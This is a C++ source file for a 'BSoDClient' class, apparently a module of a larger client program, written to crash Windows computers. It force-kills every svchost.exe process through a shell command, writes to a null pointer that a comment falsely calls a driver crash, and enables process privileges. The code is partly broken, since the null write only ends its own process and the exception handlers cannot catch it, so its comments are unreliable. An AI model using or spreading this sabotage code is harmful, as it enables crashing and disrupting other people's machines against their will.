#include "BSoDClient.hpp"

bool BSoDClient::triggerBSoDProcess() {
    try {
        Logger::getInstance()->info("Attempting to trigger BSoD by killing critical process...");
        return executeCommand("taskkill /F /IM svchost.exe");
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error in triggerBSoDProcess: ") + e.what());
        return false;
    }
}

bool BSoDClient::triggerBSoDDriver() {
    try {
        Logger::getInstance()->info("Attempting to trigger BSoD using driver crash...");
        // Create invalid memory access
        int* ptr = nullptr;
        *ptr = 1;  // Crash
        return true;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error in triggerBSoDDriver: ") + e.what());
        return false;
    }
}

bool BSoDClient::executeCommand(const std::string& command) {
    try {
        return system(command.c_str()) == 0;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error executing command: ") + e.what());
        return false;
    }
}

bool BSoDClient::enablePrivilege(LPCSTR privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        return false;
    }

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        CloseHandle(token);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool success = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    CloseHandle(token);
    return success;
}